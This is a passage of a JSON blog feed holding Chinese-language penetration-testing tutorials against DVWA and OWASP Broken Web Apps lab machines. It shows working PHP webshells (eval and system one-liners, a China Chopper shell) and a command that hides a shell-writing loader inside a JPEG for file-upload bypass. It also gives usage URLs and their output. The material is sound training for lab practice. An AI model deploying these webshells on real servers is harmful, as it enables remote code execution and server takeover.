data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$target_path</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">' succesfully uploaded!'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Your image was not uploaded.'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>后端代码显示上传文件的后缀必须为 <code>jpg、JPG、jpeg、JPEG</code> ，且文件大小不超过 100000 字节，此时修改文件类型信息已无用</p>\n<h4 id=\"上传图片马绕过检测\"><a class=\"anchor\" href=\"#上传图片马绕过检测\">#</a> 上传图片马绕过检测</h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre># Webshell.php文件编写内容</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span><span class=\"token function\">fputs</span><span class=\"token punctuation\">(</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"shell0.php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"w\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"&lt;?php @eval(<span class=\"token interpolation\"><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'chopper'</span><span class=\"token punctuation\">]</span></span>); ?>\"</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># Windows 命令</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>copy cat.jpg /b + Webshell.php /a cat0.jpg</pre></td></tr></table></figure><p>或者使用 <code>edjpgcom</code>  工具将图片和木马合成，成功上传之后需配合文件包含漏洞使用</p>\n<h2 id=\"webshell\"><a class=\"anchor\" href=\"#webshell\">#</a> Webshell</h2>\n<ul>\n<li>小马：一句话木马也称为小马，即整个 shell 代码量只有一行，一般是系统执行函数</li>\n<li>大马：代码量和功能比小马多，一般会进行二次编码加密，防止被防火墙 / 入侵系统检测到</li>\n</ul>\n<h3 id=\"shell1php\"><a class=\"anchor\" href=\"#shell1php\">#</a> shell1.php</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre># eval 使用PHP函数,如phpinfo();</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><strong>使用：</strong> <code>http://192.168.111.18/dvwa/hackable/uploads/shell1.php?cmd=phpinfo();</code></p>\n<h3 id=\"shell2php\"><a class=\"anchor\" href=\"#shell2php\">#</a> shell2.php</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre># system 使用Linux系统命令,如ls,cp,rm</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ppx'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>使用： <code>http://192.168.111.18/dvwa/hackable/uploads/shell2.php?ppx=id</code></p>\n<p>查看哪个用户运行的 apache</p>\n<p><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></p>\n<h3 id=\"中国菜刀\"><a class=\"anchor\" href=\"#中国菜刀\">#</a> 中国菜刀</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'chopper'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre># or more simple</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><div class=\"note info\">\n<p>注：REQUEST 是在网页端输入变量访问，POST 则是使用中国菜刀之类的工具连接，是 C / S 架构</p>\n</div>\n",
            "tags": [
                "Kali"
            ]
        },
        {
            "id": "https://harold-666.github.io/Kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/OWASP%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/permeable_env/",
            "url": "https://harold-666.github.io/Kali%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/OWASP%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/permeable_env/",
            "title": "安全渗透环境准备",
            "date_published": "2020-12-29T12:17:00.000Z",
            "content_html": "<h1 id=\"安全渗透环境准备\"><a class=\"anchor\" href=\"#安全渗透环境准备\">#</a> 安全渗透环境准备</h1>\n<h2 id=\"实验环境\"><a class=\"anchor\" href=\"#实验环境\">#</a> 实验环境</h2>\n<p>目标靶机：OWASP_Broken_Web_Apps_VM_1.2</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3VyY2Vmb3JnZS5uZXQvcHJvamVjdHMvb3dhc3Bid2EvZmlsZXMvbGF0ZXN0L2Rvd25sb2Fk\">https://sourceforge.net/projects/owaspbwa/files/latest/download</span></p>\n<figure class=\"highlight markdown\"><figcaption data-lang=\"markdown\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>OwASP Broken web Applications Project</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Broken web Applications (BWA)项目生成一个虚拟机，运行各种具有已知漏洞的应用程序，供以下人员使用:</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>-了解web应用程序安全性</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>-测试手册评估技术</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-测试自动化工具-测试源代码分析工具-观察网络攻击</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-测试wAF和类似的代码技术</pre></td></tr></table></figure><p>攻击渗透机：Kali Linux</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua2FsaS5vcmcvZG9jcy8=\">https://www.kali.org/docs/</span></p>\n",
            "tags": [
                "Kali"
            ]
        }
    ]
}